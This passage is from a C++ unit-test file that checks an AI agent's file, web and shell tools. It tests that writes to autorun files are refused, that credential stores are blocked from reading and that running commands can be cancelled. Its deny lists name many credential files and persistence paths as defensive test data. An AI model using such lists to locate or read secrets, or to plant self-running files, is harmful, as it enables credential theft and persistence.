    ASSERT_EQ(fn["status"], "success") << fn.dump();
    EXPECT_NE(fn["output"].get<std::string>().find("| west |"), std::string::npos) << fn["output"];
    EXPECT_EQ(tools_->queryData({{"sql", "WITH x AS (SELECT 1) REPLACE INTO scratch_sales VALUES ('a', 2)"}})["status"],
              "error");
    const std::string listed = tools_->listTables({})["output"];
    EXPECT_NE(listed.find("  sales (1 rows)"), std::string::npos) << listed;
    EXPECT_NE(listed.find("Columns: region (TEXT), revenue (REAL)"), std::string::npos) << listed;
    EXPECT_EQ(listed.find("scratch_sales ("), std::string::npos) << listed;
}

TEST_F(FlagshipToolsTest, WritersRefuseFilesThatRunOnTheirOwn) {
    for (const char* target : {"lib/python3.12/site-packages/evil.pth", "evil.pth", ".config/git/config",
                               ".config/fish/conf.d/x.fish", ".bashrc.d/x.sh", "profile.ps1.", "profile.ps1 ",
                               ".envrc", "repo/.github/workflows/ci.yml", "sitecustomize.py"}) {
        json r = tools_->writeFile({{"file_path", target}, {"content", "x"}});
        EXPECT_EQ(r["status"], "error") << target << " " << r.dump();
    }
    const fs::path home = fs::u8path(userHomeDir());
    EXPECT_FALSE(writeTargetRefusal((home / ".local" / "bin" / "ls").u8string()).empty());
    EXPECT_FALSE(writeTargetRefusal((home / ".gaia" / "mcp_servers.json").u8string()).empty());
    EXPECT_FALSE(writeTargetRefusal((home / ".gaia" / "native" / "x.md").u8string()).empty());
    EXPECT_TRUE(writeTargetRefusal((home / ".gaia" / "documents" / "upload.md").u8string()).empty());
    EXPECT_TRUE(writeTargetRefusal((root_ / "notes.md").u8string()).empty());
#ifdef _WIN32
    EXPECT_FALSE(writeTargetRefusal((root_ / "git.bat").u8string()).empty());
    EXPECT_FALSE(writeTargetRefusal((root_ / "python.cmd").u8string()).empty());
    EXPECT_FALSE(writeTargetRefusal((root_ / "notes.txt:hidden").u8string()).empty());
    write(root_ / ".env", "TOKEN=abc");
    EXPECT_EQ(tools_->readFile({{"file_path", ".env::$DATA"}})["status"], "error");
    EXPECT_EQ(tools_->readFile({{"file_path", ".env."}})["status"], "error");
#endif
}

TEST_F(FlagshipToolsTest, EditIsInsideMirrorsPythonsAutoAcceptRule) {
    const std::vector<std::string> roots = {root_.u8string()};
    EXPECT_TRUE(editIsInside((root_ / "src" / "a.py").u8string(), roots));
    EXPECT_FALSE(editIsInside((root_ / ".vscode" / "tasks.json").u8string(), roots));
    EXPECT_FALSE(editIsInside((root_ / ".git" / "config").u8string(), roots));
    EXPECT_FALSE(editIsInside((outside_ / "a.py").u8string(), roots));
    EXPECT_FALSE(editIsInside((fs::u8path(userHomeDir()) / "a.py").u8string(), {userHomeDir()}));
}

TEST_F(FlagshipToolsTest, DumpDocumentAsksFirstAndWritesOnlyTextCopies) {
    ToolRegistry reg;
    tools_->registerAll(reg);
    ASSERT_NE(reg.findTool("dump_document"), nullptr);
    EXPECT_EQ(reg.findTool("dump_document")->policy, ToolPolicy::CONFIRM);

    const std::string pdf = std::string(GAIA_REPO_FIXTURES_DIR) + "/gaia/tiers_documents/supplier_audit.pdf";
    fs::copy_file(fs::u8path(pdf), root_ / "audit.pdf");
    for (const char* out : {"x.pth", "lib/site-packages/x.pth", ".config/git/config", "run.md.", "audit.bat"}) {
        json r = tools_->dumpDocument({{"file_name", "audit.pdf"}, {"output_path", out}});
        EXPECT_EQ(r["status"], "error") << out << " " << r.dump();
    }
    json def = tools_->dumpDocument({{"file_name", "audit.pdf"}});
    ASSERT_EQ(def["status"], "success") << def.dump();
    EXPECT_NE(def["output_path"].get<std::string>().find("audit_extracted.md"), std::string::npos);
}

TEST_F(FlagshipToolsTest, CredentialStoresAreRefusedForReading) {
    const fs::path home = fs::u8path(userHomeDir());
    for (const fs::path& p : {home / ".git-credentials", home / ".config" / "gh" / "hosts.yml",
                              home / ".claude" / ".credentials.json", home / ".cargo" / "credentials.toml",
                              home / ".local" / "share" / "keyrings" / "login.keyring",
                              home / "Library" / "Keychains" / "login.keychain-db", home / ".netrc", home / "_netrc",
                              home / ".pgpass", home / ".docker" / "config.json", home / ".kube" / "config",
                              home / ".npmrc", home / ".pypirc", home / ".aws" / "config", home / ".azure" / "x",
                              home / ".config" / "gcloud" / "x", root_ / "logins.json", root_ / "key4.db",
                              root_ / "Login Data", root_ / "Cookies", root_ / ".env.staging",
                              root_ / ".env.production.local"}) {
        EXPECT_FALSE(credentialRefusal(p.u8string()).empty()) << p.u8string();
    }
    EXPECT_TRUE(credentialRefusal((root_ / ".env.example").u8string()).empty());
    write(root_ / ".git-credentials", "https://u:tok@github.com");
    write(root_ / ".env.staging", "TOKEN=abc");
    EXPECT_EQ(tools_->readFile({{"file_path", ".git-credentials"}})["status"], "error");
    json found = tools_->searchFileContent({{"pattern", "TOKEN"}});
    EXPECT_EQ(found["total_matches"], 0) << found.dump();
    EXPECT_FALSE(tools_->getFileInfo({{"file_path", ".env.staging"}}).contains("preview"));
}

TEST_F(FlagshipToolsTest, DownloadRefusesDriveAndStreamNames) {
    tools_->setHttpGet([](const std::string&) {
        HttpFetch f;
        f.status = 200;
        f.body = "@echo off";
        return f;
    });
    for (const char* name : {"D:run.bat", "C:\\x.bat", "x:y", "..", "...", "/etc/x"}) {
        json r = tools_->downloadFile({{"url", "https://example.com/a"}, {"save_to", root_.u8string()}, {"filename", name}});
        EXPECT_EQ(r["status"], "error") << name << " " << r.dump();
    }
    std::size_t files = 0;
    for (const auto& e : fs::directory_iterator(root_)) files += e.is_regular_file() ? 1 : 0;
    EXPECT_EQ(files, 0u);
}

TEST_F(FlagshipToolsTest, ResultsStayValidUtf8) {
    ToolRegistry reg;
    reg.registerTool("bad_bytes", "returns bytes that are not UTF-8", [](const json&) {
        return json{{"status", "success"}, {"text", std::string("ok \xff\xfe end")}, {std::string("k\xc0"), "v"},
                    {"nested", json::array({std::string("\xed\xa0\x80")})}};
    });
    json r = reg.executeTool("bad_bytes", json::object());
    std::string dumped;
    ASSERT_NO_THROW(dumped = r.dump());
    EXPECT_NE(dumped.find("ok \xEF\xBF\xBD\xEF\xBF\xBD end"), std::string::npos) << dumped;
    EXPECT_TRUE(isValidUtf8(dumped));
    EXPECT_FALSE(isValidUtf8("\xC0\xAF"));          // overlong '/'
    EXPECT_FALSE(isValidUtf8("\xED\xA0\x80"));      // surrogate
    EXPECT_FALSE(isValidUtf8("\xF4\x90\x80\x80"));  // past U+10FFFF
    EXPECT_TRUE(isValidUtf8("caf\xC3\xA9 \xF0\x9F\x98\x80"));
}

TEST_F(FlagshipToolsTest, WebTextFromOtherEncodingsAndBadEntitiesIsValidUtf8) {
    tools_->setHttpGet([](const std::string& url) {
        HttpFetch f;
        f.status = 200;
        f.contentType = "text/html";
        if (url.find("long") != std::string::npos) {
            f.body = "<p>" + std::string(5000, 'a') + " needle " + std::string(5000, 'b') + "</p>";
        } else {
            f.body = "<title>caf\xe9</title><p>caf\xe9 &#xD800; &#0; &#x110000; ok</p>";
        }
        return f;
    });
    json r = tools_->fetchWebpage({{"url", "https://example.com/latin1"}});
    ASSERT_EQ(r["status"], "success") << r.dump(-1, ' ', false, json::error_handler_t::replace);
    ASSERT_NO_THROW(r.dump());
    EXPECT_NE(r["content"].get<std::string>().find("\xEF\xBF\xBD ok"), std::string::npos);
    ASSERT_NO_THROW(tools_->fetchPage({{"url", "https://example.com/latin1"}}).dump());
    EXPECT_EQ(htmlToText("<p>&#xD800;</p>"), "\xEF\xBF\xBD");

    json found = tools_->fetchPage({{"url", "https://example.com/long"}, {"find", "needle"}});
    const std::string passage = found["content"];
    EXPECT_NE(passage.find("needle"), std::string::npos);
    EXPECT_LT(passage.size(), 1000u) << passage.size();
}

TEST_F(FlagshipToolsTest, ContentSearchDecodesAnsiFilesAndCutsOnCharacters) {
    write(root_ / "ansi.txt", std::string("caf\xE9 needle ") + std::string(400, '\xE9'));
    write(root_ / "utf8.txt", std::string(299, 'a') + "needle" + std::string(100, 'x'));
    write(root_ / "wide.txt", "needle" + std::string(293, 'a') + "\xC3\xA9\xC3\xA9");
    json r = tools_->searchFileContent({{"pattern", "needle"}});
    ASSERT_EQ(r["total_matches"], 3) << r.dump(-1, ' ', false, json::error_handler_t::replace);
    for (const auto& m : r["matches"]) EXPECT_TRUE(isValidUtf8(m["content"].get<std::string>())) << m["file"];
    ASSERT_NO_THROW(r.dump());
    write(root_ / "head.txt", std::string(511, 'a') + "\xC3\xA9 tail");
    const std::string preview = tools_->getFileInfo({{"file_path", "head.txt"}})["preview"];
    EXPECT_EQ(preview, std::string(511, 'a'));
}

TEST(HttpHeaderBlocksTest, SkipsProxyTunnelAndInterimBlocks) {
    HttpFetch f;
    const std::string viaProxy =
        "HTTP/1.1 200 Connection established\r\nProxy-agent: squid\r\n\r\n"
        "HTTP/1.1 301 Moved Permanently\r\nLocation: /next\r\nContent-Length: 0\r\n\r\n";
    EXPECT_EQ(viaProxy.substr(parseHttpHeaderBlocks(viaProxy, f)), "");
    EXPECT_EQ(f.status, 301);
    EXPECT_EQ(f.location, "/next");

    HttpFetch g;
    const std::string interim =
        "HTTP/1.1 100 Continue\r\n\r\nHTTP/1.1 103 Early Hints\r\nLink: </a.css>\r\n\r\n"
        "HTTP/2 200\r\ncontent-type: text/html\r\ncontent-length: 21\r\n\r\nHTTP/1.1 is the body";
    EXPECT_EQ(interim.substr(parseHttpHeaderBlocks(interim, g)), "HTTP/1.1 is the body");
    EXPECT_EQ(g.status, 200);
    EXPECT_EQ(g.contentType, "text/html");
    EXPECT_EQ(g.location, "");
}

TEST(PrivateHostTest, ReservedSharedAndEmbeddedRangesArePrivate) {
    for (const char* h : {"224.0.0.1", "239.255.255.250", "240.0.0.1", "255.255.255.255", "198.18.0.1", "198.19.255.1",
                          "100.64.0.1", "100.127.255.254", "0.1.2.3", "192.0.0.8", "::7f00:1", "ff02::1", "fec0::1",
                          "fe80::1", "fd00::1", "2002:7f00:1::1", "2002:a00:1::1"}) {
        EXPECT_TRUE(isPrivateHost(h)) << h;
    }
    for (const char* h : {"8.8.8.8", "100.128.0.1", "198.20.0.1", "2001:4860:4860::8888", "2002:808:808::1"}) {
        EXPECT_FALSE(isPrivateHost(h)) << h;
    }
}

TEST_F(FlagshipToolsTest, CancelStopsShellAndPythonPromptly) {
    std::thread trigger([this] {
        std::this_thread::sleep_for(std::chrono::milliseconds(300));
        cancel_ = true;
    });
    auto t0 = std::chrono::steady_clock::now();
#ifdef _WIN32
    json r = tools_->runShellCommand({{"command", "ping -n 31 127.0.0.1 >nul"}});
#else
    json r = tools_->runShellCommand({{"command", "sleep 30"}});
#endif
    trigger.join();
    EXPECT_LT(std::chrono::steady_clock::now() - t0, std::chrono::seconds(2));
    EXPECT_EQ(r["status"], "cancelled") << r.dump();
    EXPECT_NE(r.value("error", "").find("Cancelled by the user"), std::string::npos);

    // Nothing the cancelled command started keeps running: the grandchild would write the marker at ~2 s.
    cancel_ = false;
    const fs::path marker = root_ / "late.txt";
    std::thread again([this] {
        std::this_thread::sleep_for(std::chrono::milliseconds(300));
        cancel_ = true;
    });
#ifdef _WIN32
    r = tools_->runShellCommand({{"command", "cmd /c \"ping -n 3 127.0.0.1 >nul & echo late> late.txt\""}});
#else
    r = tools_->runShellCommand({{"command", "sh -c 'sleep 2; echo late > late.txt'"}});
#endif
    again.join();
    EXPECT_EQ(r["status"], "cancelled") << r.dump();
    std::this_thread::sleep_for(std::chrono::milliseconds(3000));
    EXPECT_FALSE(fs::exists(marker));

    cancel_ = false;
    std::thread third([this] {
        std::this_thread::sleep_for(std::chrono::milliseconds(300));
        cancel_ = true;
    });
    t0 = std::chrono::steady_clock::now();
    json py = tools_->runPython({{"code", "import time\ntime.sleep(30)\n"}});
    third.join();
    if (py["status"] == "error" && py.value("error", "").find("No Python interpreter") != std::string::npos) {
        GTEST_SKIP() << "no Python on PATH";
    }
    EXPECT_LT(std::chrono::steady_clock::now() - t0, std::chrono::seconds(2));
    EXPECT_EQ(py["status"], "cancelled") << py.dump();
}
